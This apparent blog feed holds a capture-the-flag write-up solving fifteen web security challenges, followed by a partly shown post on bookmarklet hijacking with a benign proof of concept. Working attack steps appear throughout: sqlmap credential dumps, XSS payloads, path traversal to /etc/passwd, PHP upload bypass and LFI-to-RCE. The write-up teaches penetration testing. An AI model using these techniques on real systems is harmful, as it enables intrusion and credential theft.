<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-08T19:39:49+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Kamil Vavra | @vavkamil</title><subtitle>Offensive website security | Bug bounty | Ethical hacking</subtitle><author><name>vavkamil</name></author><entry><title type="html">AEC SafeWeb CTF Write-up</title><link href="http://localhost:4000/blog/2024-07-30-aec-safeweb-ctf-writeup/" rel="alternate" type="text/html" title="AEC SafeWeb CTF Write-up" /><published>2024-07-30T02:00:00+02:00</published><updated>2024-07-30T02:00:00+02:00</updated><id>http://localhost:4000/blog/aec-safeweb-ctf-writeup</id><content type="html" xml:base="http://localhost:4000/blog/2024-07-30-aec-safeweb-ctf-writeup/"><![CDATA[<p>AEC Hacking Competition is a famous Czech CTF with 15 web application security challenges. It used to work like this: If you solved at least 12 challenges, you were invited for the penetration tester interview.</p>

<p>Today, only around 28 people out of several hundred could solve all the challenges. Many ethical hackers were stuck on some levels, maybe because the instructions were not clear or outdated.</p>

<p>The CTF is from ~2018, and the authors last updated the challenges a while ago. We could do better, especially for new people starting in the penetration testing field. The same challenges are also reused every year on <strong>KonferenceSecurity.cz CTF</strong>. I was the sixth person who solved all the challenges, and I received an e-mail recently from someone stuck on the first level asking for advice.</p>

<p>So, after many years, I finally decided to try to solve them again and describe my steps. I did this mainly to help beginners see that it’s easy if they think like ethical hackers and have the correct mindset and necessary skills. I would also like to see new levels that reflect the current application security state and the OWASP Top 10.</p>

<hr />

<h3 id="table-of-contents">Table of contents</h3>

<ul>
  <li><a href="#level-1">Level #1</a></li>
  <li><a href="#level-2">Level #2</a></li>
  <li><a href="#level-3">Level #3</a></li>
  <li><a href="#level-4">Level #4</a></li>
  <li><a href="#level-5">Level #5</a></li>
  <li><a href="#level-6">Level #6</a></li>
  <li><a href="#level-7">Level #7</a></li>
  <li><a href="#level-8">Level #8</a></li>
  <li><a href="#level-9">Level #9</a></li>
  <li><a href="#level-10">Level #10</a></li>
  <li><a href="#level-11">Level #11</a></li>
  <li><a href="#level-12">Level #12</a></li>
  <li><a href="#level-13">Level #13</a></li>
  <li><a href="#level-14">Level #14</a></li>
  <li><a href="#level-15">Level #15</a></li>
</ul>

<hr />

<p><img src="/assets/img/2024/07/ctf_19.png" alt="ctf_19.png" /></p>

<h2 id="level-1">Level 1</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level1.php</li>
  <li>Task: <em>Log in as an information system admin.</em></li>
  <li>Hint: <em>A cross between a Jack Russel terrier and a dachshund.</em></li>
</ul>

<p>At the first level, we have a login form with <code class="language-plaintext highlighter-rouge">user:pass</code> inputs and a hint indicating a specific dog (which could be the password). We have to guess the username. The dog’s name is <code class="language-plaintext highlighter-rouge">Krasty</code>. It was the mascot of the company Seznam and used to be the most famous dog in Czechia. Unfortunately, he “retired” many years ago, so chances are most young people won’t get the idea.</p>

<p>To solve this, we can send the POST request to Burp’s Intruder, with one payload set for <code class="language-plaintext highlighter-rouge">login</code> and the other for <code class="language-plaintext highlighter-rouge">password</code>. We will be using <code class="language-plaintext highlighter-rouge">Cluster bomb</code> attack with the following configuration:</p>

<ul>
  <li>Payload set 1: Usernames (List)</li>
  <li>Payload set 2: Case modification (krasty)</li>
</ul>

<p><img src="/assets/img/2024/07/ctf_01.png" alt="ctf_01.png" /></p>

<p><img src="/assets/img/2024/07/ctf_02.png" alt="ctf_02.png" /></p>

<p>After 9k requests, we can see that the correct credentials are <code class="language-plaintext highlighter-rouge">administrator:Krasty</code>, and we solved the first level.</p>

<hr />

<h2 id="level-2">Level 2</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level2.php</li>
  <li>Task: <em>Log in as the admin user</em></li>
  <li>Hint: <em>User-Agent</em></li>
</ul>

<p>Again, we have a login form with <code class="language-plaintext highlighter-rouge">user:pass</code> inputs, and based on the hint, we will have to modify the user agent. The form’s title, <code class="language-plaintext highlighter-rouge">D-Link Router - Firmware DI-604UP,</code> indicated an exploit against an old Wi-Fi router. After a bit of googling, it looks like <strong>CVE-2013-026</strong>, where a backdoor in the firmware allowed to bypass authentication if one sets <code class="language-plaintext highlighter-rouge">xmlset_roodkcableoj28840ybtide</code> string as User-Agent.</p>

<p><img src="/assets/img/2024/07/ctf_03.png" alt="ctf_03.png" /></p>

<p>So, let’s send the authentication request to Repeter and test it out. And just like that, we solved another level.</p>

<hr />

<h2 id="level-3">Level 3</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level3.php</li>
  <li>Task: <em>Log in as the admin user</em></li>
  <li>Hint: <em>There are backups of sensitive data on the server</em></li>
</ul>

<p>Level #3 is the same login form, and the hint indicates there is some backup file we can use to get the credentials. Observing the POST request in Burp, we can see the following path is used:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">POST /library/login.php HTTP/1.1</code></li>
</ul>

<p>After navigating to:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">https://safeweb.aec.cz/library/</code></li>
</ul>

<p>There are two files:</p>
<ul>
  <li>login.php</li>
  <li>topsecret.txt</li>
</ul>

<p>With the credentials:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Login: nbusr
Password: nbusr123
</code></pre></div></div>

<p>These credentials are an excellent reference to a time when our National Security Agency (NBU) was compromised because they were literally the credentials they were using at the time. And thanks to them, we just solved another level.</p>

<hr />

<h2 id="level-4">Level 4</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level4.php?uid=1</li>
  <li>Task: <em>Log in as the admin user</em></li>
  <li>Hint: <em>SQL Injection</em></li>
</ul>

<p>Level #4 is the same login form but with a twist. The <code class="language-plaintext highlighter-rouge">uid</code> parameter fetches the username from the database and prefills the login input.</p>

<p><img src="/assets/img/2024/07/ctf_04.png" alt="ctf_04.png" /></p>

<p>We are looking at a classic SQL Injection here, and the best tool for this task is <code class="language-plaintext highlighter-rouge">sqlmap</code>. To do this, we can right-click on the GET request and use <code class="language-plaintext highlighter-rouge">Copy to file</code> in Burp. You can then use the request with <code class="language-plaintext highlighter-rouge">sqlmap</code> like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --threads=10 -r sqli.txt --dbs
$ sqlmap --threads=10 -r sqli.txt --tables -D testdb_2014_1
$ sqlmap --threads=10 -r sqli.txt --columns -T users -D testdb_2014_1
$ sqlmap --threads=10 -r sqli.txt --dump -T users -D testdb_2014_1

Database: testdb_2014_1                                                                      
Table: users
[3 entries]
+----+-------+-------------+
| id | login | password    |
+----+-------+-------------+
| 1  | john  | Password    |
| 2  | bob   | abc123      |
| 0  | admin | asdfasdf123 |
+----+-------+-------------+
</code></pre></div></div>

<p>And just like that, we solved another level.</p>

<hr />

<h2 id="level-5">Level 5</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level5.php</li>
  <li>Task: <em>Log in as the admin user. Your user credentials are: guest/tajneheslo</em></li>
  <li>Hint: <em>Cookies</em></li>
</ul>

<p>This level is another login form, but now we have guest access. The goal is to escalate permissions to the admin using Cookies. After successful authentication, we can observe that a server response sets a <code class="language-plaintext highlighter-rouge">login</code> cookie.</p>

<p><img src="/assets/img/2024/07/ctf_05.png" alt="ctf_05.png" /></p>

<p>Send the authenticated GET request to Repeter, highlight the cookie value, and you will see that it is our <code class="language-plaintext highlighter-rouge">base64</code> encoded username. We can change the value to <code class="language-plaintext highlighter-rouge">admin</code>, resend the request, and solve the level.</p>

<p><img src="/assets/img/2024/07/ctf_06.png" alt="ctf_06.png" /></p>

<hr />

<h2 id="level-6">Level 6</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level6.php</li>
  <li>Task: <em>Invoke an XSS error where you automatically call the alert() function displaying the contents of the cookie.</em></li>
  <li>Hint: <em>A multiline comment in JavaScript</em></li>
</ul>

<p>Level #6 is a funny reference to Czech hacking history, when <code class="language-plaintext highlighter-rouge">Mr.Sysel</code> proved that a blog can be hacked with a limited number of characters.</p>

<p>We have another login form with four different inputs this time. By observing the form, each input has a limit of 30 characters, but the challenge is to execute:</p>

<p><code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(document.cookies)&lt;/script&gt;</code></p>

<p>which does have 40 characters. To verify which inputs are vulnerable to XSS, we will use these payloads:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">"&gt;foo</code></li>
  <li><code class="language-plaintext highlighter-rouge">"&gt;bar</code></li>
  <li><code class="language-plaintext highlighter-rouge">"&gt;baz</code></li>
  <li><code class="language-plaintext highlighter-rouge">"&gt;qux</code></li>
</ul>

<p><img src="/assets/img/2024/07/ctf_07.png" alt="ctf_07.png" /></p>

<p>The first three inputs are vulnerable. Based on the hint, we have to use JS multiline comments. We will start the XSS payload in the first input, comment on the rest of the HTML code, end the comment in the second input, enter the payload, and comment on the rest. We will end the comment and the javascript payload in the last input.</p>

<p>It sounds way too complicated, but what we are doing is pretty much:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;<span class="nt">&lt;script&gt;</span><span class="cm">/* commented HTML
commented HTML */</span> <span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="cm">/* commented HTML
commented HTML */</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="/assets/img/2024/07/ctf_08.png" alt="ctf_08.png" /></p>

<hr />

<h2 id="level-7">Level 7</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level7.php</li>
  <li>Task: <em>Private section of the site. You can find the application form for the club here.</em></li>
  <li>Hint: <em>In addition to the application, more interesting files can be found in the download section</em></li>
</ul>

<p>We again have another login form. This time, we must find the password to access the private “Club” area. We have the following URL to download the application PDF:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://safeweb.aec.cz/download.php?file_id=42</code></li>
</ul>

<p><img src="/assets/img/2024/07/ctf_09.png" alt="ctf_09.png" /></p>

<p>Let’s send this to Intruder to check if there are other file IDs. We can use <code class="language-plaintext highlighter-rouge">Sniper</code> with one payload set, type <code class="language-plaintext highlighter-rouge">Number</code>, and range of <code class="language-plaintext highlighter-rouge">1 - 100</code>.</p>

<p><img src="/assets/img/2024/07/ctf_10.png" alt="ctf_10.png" /></p>

<p>After executing the Intruder attack, we can see another document with ID <code class="language-plaintext highlighter-rouge">87</code>, a TXT file with a password:</p>

<ul>
  <li>https://safeweb.aec.cz/HesloDoKlubu.txt
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Heslo: horiii</code></li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="level-8">Level 8</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level8.php</li>
  <li>Task: <em>Private section of the site. Log in…</em></li>
  <li>Hint: <em>The password is checked on the client side</em></li>
</ul>

<p>Level #8 is tempting, yet another login form, but now the password is obfuscated in JavaScript. So, we must figure out how to obtain the plaintext client side. Looking at the code, we can see the obfuscated value of the password is compared against our form input at the end:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">!=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="nx">d</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">f</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">g</span><span class="p">,</span><span class="nx">e</span><span class="p">)){</span>
<span class="p">...</span>
</code></pre></div></div>

<p>In this case, all we have to do is to get the value of:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">String.fromCharCode(c,d,b,f,a,g,e)</code></li>
</ul>

<p>Using the browser JS console, we get the following error:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">ReferenceError: c is not defined</code></li>
</ul>

<p>It’s not that easy, as the password value is dynamically computed during script execution. But we can use JS Debugger like this:</p>

<ol>
  <li>Go to the Sources tab in Chrome DevTools</li>
  <li>Add <code class="language-plaintext highlighter-rouge">String.fromCharCode(c,d,b,f,a,g,e)</code> as Watch expression</li>
  <li>Pause script execution</li>
  <li>Submit the form with any password</li>
  <li>Click on “Step over the next function call” multiple times</li>
  <li>You will see that the password value is <code class="language-plaintext highlighter-rouge">heureka</code> ;)</li>
</ol>

<p><img src="/assets/img/2024/07/ctf_11.png" alt="ctf_11.png" /></p>

<p>I don’t know if this is the easiest method to solve this level, but it saves a lot of time when debugging what is happening.</p>

<hr />

<h2 id="level-9">Level 9</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level9.php</li>
  <li>Task: <em>Private section of the site.
You can check the correctness of the password using the application (for Windows here, for Linux here)</em></li>
  <li>Hint: <em>No knowledge of assembler is required</em></li>
</ul>

<p>Oh no, this is a reverse engineering challenge. I sux at these, but based on the hint, it should be easy. So, let’s download the <code class="language-plaintext highlighter-rouge">CrackMe</code> binary and run <code class="language-plaintext highlighter-rouge">strings</code> command on it.</p>

<p>Looking at the Burp HTTP history, we can see the strings already. So a quick search for <code class="language-plaintext highlighter-rouge">password</code> reveals the <code class="language-plaintext highlighter-rouge">Popocatepetl</code>, which looks interesting!</p>

<p><img src="/assets/img/2024/07/ctf_12.png" alt="ctf_12.png" /></p>

<p>And look at that; it’s, in fact, the correct password. I love this one.</p>

<hr />

<h2 id="level-10">Level 10</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level10.php</li>
  <li>Task: <em>Find out the contents of the /etc/passwd file.</em></li>
  <li>Hint: <em>Null Byte</em></li>
</ul>

<p>Luckily, Level #10 is another web security challenge, and it looks like standard Local File Inclusion. We have the following URL:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://safeweb.aec.cz/level10.php?page=main</code></li>
</ul>

<p>And we have to get the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file contents like this:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://safeweb.aec.cz/level10.php?page=../../etc/passwd%00</code></li>
</ul>

<p>Is it just me, or are the challenges getting easier? One would expect that they would become more complicated as one progresses.</p>

<hr />

<h2 id="level-11">Level 11</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level11.php</li>
  <li>Task: <em>Upload a file to the server which, when loaded in the browser, will run any PHP code.</em></li>
  <li>Hint: <em>Unknown extension</em></li>
</ul>

<p>Nice. Finally, there is something way more interesting. We have an insecure file upload and must execute PHP on the server.</p>

<p>First, create a <code class="language-plaintext highlighter-rouge">file.php</code> with the following contents:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"&lt;? phpinfo(); ?&gt;"</span> <span class="o">&gt;</span> file.php
</code></pre></div></div>
<p>And try uploading that. We will get an error message saying only the following file extensions are allowed: <code class="language-plaintext highlighter-rouge">.jpg, .jpeg, .png, .gif, .bmp</code>.</p>

<p>Next, forward the POST request to Repeter and try to change the file extension to <code class="language-plaintext highlighter-rouge">.jpg</code>. We get the same error, indicating that the mime type is verified.</p>

<p>Change the:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Content-Type: application/x-php</code></li>
</ul>

<p>to:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Content-Type: image/jpeg</code></li>
</ul>

<p>and the file was uploaded, but no PHP code is executed on the server. Changing the file extension back to .<code class="language-plaintext highlighter-rouge">php</code> doesn’t work, but surprisingly <code class="language-plaintext highlighter-rouge">.phpjpg</code> works.</p>

<p>The backend code only checks that the <code class="language-plaintext highlighter-rouge">jpg</code> string is present at the end of the file extension. At this point, the hint <code class="language-plaintext highlighter-rouge">Unknown extension</code> is valuable. This vulnerability is known as “double extension”, where, for Apache, the order of extensions is irrelevant. If the server doesn’t know the extension, it will ignore it, and if there is <code class="language-plaintext highlighter-rouge">.php</code> extension, our file executes as a PHP script :)</p>

<p><img src="/assets/img/2024/07/ctf_13.png" alt="ctf_13.png" /></p>

<p>Simply renaming the file to something like:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">file.php.unknown-jpg</code>
will do the trick. This challenge is complex, and a lot of people might get stuck.</li>
</ul>

<hr />

<h2 id="level-12">Level 12</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level12.php</li>
  <li>Task: <em>Write the captcha test five hundred times. Done: 0/500.</em></li>
  <li>Hint: <em>Robot</em></li>
</ul>

<p>Level #12 is entirely different from what we saw before. To solve this challenge, we must write a script to bypass Captcha verification 500 times.</p>

<p>The form title contains a six-digit number. Sending this number gets us one point out of 500. The number changes each time the form is submitted.</p>

<p>You don’t need programming experience; you can do all the steps in the Burp Suite. This challenge can be seen in the real world, where you must extract CSRF tokens from the response and use them in another.</p>

<p>We will use a combo of Macro and Intruder. Follow the white rabbit:</p>
<ol>
  <li>Burp &gt; Settings</li>
  <li>Sessions</li>
  <li>Macros &gt; Add</li>
  <li>Add the GET request to <code class="language-plaintext highlighter-rouge">/level12.php</code></li>
  <li>Configure item</li>
  <li>Add custom parameter location</li>
  <li>Parameter name: captcha</li>
  <li>Select the number to extract, click OK</li>
  <li>In Burp &gt; Settings &gt; Sessions</li>
  <li>Add Session handling rules</li>
  <li>Add Rule action; Run a macro, click OK</li>
  <li>Scope; Include all URLs</li>
</ol>

<p><img src="/assets/img/2024/07/ctf_14.png" alt="ctf_14.png" /></p>

<p><img src="/assets/img/2024/07/ctf_15.png" alt="ctf_15.png" /></p>

<p>You should be all set. The Macro will extract the number, which you can use in the Intruder. Send the POST request to Intruder.</p>

<p>Add another param like this:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">captcha=1&amp;ok=Send&amp;foo=§bar§</code></li>
</ul>

<ol>
  <li>Use <code class="language-plaintext highlighter-rouge">Sniper</code>, for payload type <code class="language-plaintext highlighter-rouge">Numbers</code></li>
  <li><code class="language-plaintext highlighter-rouge">Sequence</code> from <code class="language-plaintext highlighter-rouge">1 </code>to <code class="language-plaintext highlighter-rouge">500</code></li>
  <li>Create a new resource pool</li>
  <li>Maximum concurrent requests: <code class="language-plaintext highlighter-rouge">1</code></li>
  <li>Start the attack</li>
</ol>

<p><img src="/assets/img/2024/07/ctf_16.png" alt="ctf_16.png" /></p>

<p>Now, each request from Intruder should have a different (extracted) captcha number, and you just solved another level without any programming!</p>

<hr />

<h2 id="level-13">Level 13</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level13.php</li>
  <li>Task: <em>Run the phpinfo() function on the PHP server.</em></li>
  <li>Hint: <em>Process environment</em></li>
</ul>

<p>Level #13 is another Local File Inclusion, but with a twist, we have to chain it with RCE.</p>

<p>We have a URL like this:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">https://safeweb.aec.cz/level13.php?page=main.php</code></li>
</ul>

<p>Meanwhile, the <code class="language-plaintext highlighter-rouge">page</code> parameter should be vulnerable to LFI. Usually, you will try to load any local file to verify that it’s exploitable. You can get stuck here, as the CTF returns only one file.</p>

<p>As the hint indicates, you must look for <code class="language-plaintext highlighter-rouge">/proc/self/environ</code> and nothing else. Escalating an LFI vulnerability to RCE was often possible using that file and reading environment variables.</p>

<p>In this case, we can see environment variables related to the request: the IP address, User-Agent, and preferred language sent by the client.</p>

<p><img src="/assets/img/2024/07/ctf_17.png" alt="ctf_17.png" /></p>

<p>Changing the User-Agent string to any PHP payload should do the trick.</p>

<hr />

<h2 id="level-14">Level 14</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level14.php</li>
  <li>Task: <em>Private section of the site. Is the password the same as the name of the virus discussed in the article published on the AEC website on 6/19/2000?</em></li>
  <li>Hint: <em>Internet Archive</em></li>
</ul>

<p>Level #14 concerns OSINT; we must find an ancient blog article on a website. Following the hint, we should use <code class="language-plaintext highlighter-rouge">web.archive.org</code>.</p>

<ol>
  <li>Go to: <code class="language-plaintext highlighter-rouge">https://web.archive.org/web/20240000000000*/https://aec.cz</code></li>
  <li>Change year to 2000: <code class="language-plaintext highlighter-rouge">https://web.archive.org/web/20000000000000*/https://aec.cz</code></li>
  <li>There is one snapshot from Jun 21st</li>
  <li>Open the link: <code class="language-plaintext highlighter-rouge">https://web.archive.org/web/20000621192659/http://www.aec.cz/</code></li>
  <li>The virus name (password) is <code class="language-plaintext highlighter-rouge">VBS.Stages.A</code></li>
</ol>

<p>This challenge might seem strange initially, but the Web Archive can be helpful during bug bounty hunting. On old website versions, you can find old hidden artifacts, URL parameters, sitemaps, and other stuff. There are many tools to automate that, and I have seen many bug bounty write-ups strike gold this way.</p>

<hr />

<h2 id="level-15">Level 15</h2>

<ul>
  <li>Url: https://safeweb.aec.cz/level15.php</li>
  <li>Task: <em>Private section of the site. The password is the same as the name of the home directory (user) in which this login script is located on the server.</em></li>
  <li>Hint: <em>Full Path Disclosure (FPD) - untreated variables</em></li>
</ul>

<p>We have the last level before us. This challenge aims to exploit the Full Path Disclosure vulnerability to extract the username from the path.</p>

<p>As in the previous task, this is not a severe vulnerability alone, but it often becomes critical when chained with other vulnerabilities.</p>

<p><img src="/assets/img/2024/07/ctf_18.png" alt="ctf_18.png" /></p>

<p>Send the POST request to Repetaer and try to change the password parameter to an array. You will see an error message with the Full Path, granting you the password and access to the Hall of Fame.</p>

<p><strong>Congratulations!</strong></p>

<hr />

<p>All in all, I like the concept of solving the CTF to get a spot at the interview. Some of the challenges are easy, and some are somewhat strange. However, an experienced penetration tester should be able to complete them all in one to two hours.</p>

<p>If you are starting your career now, it might seem complicated, and you will eventually get stuck on some of these. On the one hand, you should have a general overview of most of the stuff used within the CTF; on the other, they are pretty old, and you will see only some of them that often nowadays.</p>

<p>I believe that in 2024, we need something better that reflects the current state of OWASP’s Top 10, the learning paths that young ethical hackers looking for penetration testing careers take, and the security challenges we see in the real world. <strong>Good luck!</strong></p>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Security Research" /><category term="Responsible disclosure" /><category term="ctf" /><category term="writeup" /><category term="hacking" /><category term="security" /><summary type="html"><![CDATA[AEC Hacking Competition is a famous Czech CTF with 15 web application security challenges. It used to work like this: If you solved at least 12 challenges, you were invited for the penetration tester interview.]]></summary></entry><entry><title type="html">Bookmarklet hijacking</title><link href="http://localhost:4000/blog/2023-10-26-bookmarklet-hijacking/" rel="alternate" type="text/html" title="Bookmarklet hijacking" /><published>2023-10-26T02:00:00+02:00</published><updated>2023-10-26T02:00:00+02:00</updated><id>http://localhost:4000/blog/bookmarklet-hijacking</id><content type="html" xml:base="http://localhost:4000/blog/2023-10-26-bookmarklet-hijacking/"><![CDATA[<p>I noticed an exciting link shared on Hacker News titled “<a href="https://news.ycombinator.com/item?id=38014069">Wait, what’s a bookmarklet?</a>”. I have been using them for a long time, and while reading that discussion, it was nice to see people sharing useful ones they use to make their everyday tasks easier.</p>

<p>The security engineering mind got me thinking about the security implications of saving bookmarks with JavaScript from other websites, especially when readers share links to the GitHub gists.</p>

<p>We already know executing any non-trusted JavaScript is a wrong move. People were being tricked into pasting stuff into the browser console on popular websites and got hacked that way. There were even massive phishing campaigns using malicious <a href="https://breakdev.org/hacked-discord-bookmarklet-attacks/">bookmarklets against Discord users</a>.</p>

<p>But what if the victim is cautious and examines the content of bookmarklet JS before saving them to bookmarks? People often hover over links to see if they lead to malicious sites.</p>

<p>So, I was thinking about changing the content before the user saved it to bookmarks and was experimenting with the ondragstart Event. I came up with a very simple Proof of Concept for Chromium-based browsers and Firefox - <a href="https://gist.github.com/vavkamil/0b167814cabf8787cd4c4ab629614c6e">https://gist.github.com/vavkamil/0b167814cabf8787cd4c4ab629614c6e</a>.</p>

<p>It’s a simple PoC where the href attribute specifies the link’s destination:</p>

<p><code class="language-plaintext highlighter-rouge">javascript: (() =&gt; { alert(1); })();</code></p>

<p>And after saving to bookmarks, it changes to:</p>

<p><code class="language-plaintext highlighter-rouge">javascript: (() =&gt; { alert(2); })();</code></p>

<p>You can see it here: <a href="https://xss.vavkamil.cz/bookmarklet.html">https://xss.vavkamil.cz/bookmarklet.html</a></p>

<h3 id="chromium-version-1180599388">Chromium Version 118.0.5993.88</h3>

<video src="/assets/img/2023/10/bookmarklets_chromium.webm"></video>

<h3 id="mozilla-firefox-1190">Mozilla Firefox 119.0</h3>

<video src="/assets/img/2023/10/bookmarklets_firefox.webm"></video>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Bookmarklet</span> <span class="nx">hijacking</span> <span class="nx">PoC</span><span class="o">&lt;</span><span class="sr">/title</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Bookmarklet</span> <span class="nx">hijacking</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Chromium</span> <span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">h3</span><span class="o">&gt;</span><span class="nx">Steps</span> <span class="nx">to</span> <span class="nx">reproduce</span><span class="o">&lt;</span><span class="sr">/h3</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Drag</span> <span class="o">&amp;</span> <span class="nx">drop</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">to</span> <span class="nc">Bookmarks </span><span class="p">(</span><span class="nx">tool</span><span class="p">)</span><span class="nx">bar</span><span class="o">&lt;</span><span class="sr">/strong&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Click</span> <span class="nx">the</span> <span class="nx">link</span> <span class="k">in</span> <span class="nx">Bookmarks</span><span class="p">;</span> <span class="nx">it</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">2</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(1); })();</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">myLink</span><span class="dl">"</span> <span class="nx">draggable</span><span class="o">=</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Save</span> <span class="k">this</span> <span class="nx">cool</span> <span class="nx">bookmarklet</span><span class="o">!&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
        <span class="kd">const</span> <span class="nx">linkElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">myLink</span><span class="dl">'</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">originalLink</span> <span class="o">=</span> <span class="nx">linkElement</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>

        <span class="nx">linkElement</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">dragstart</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
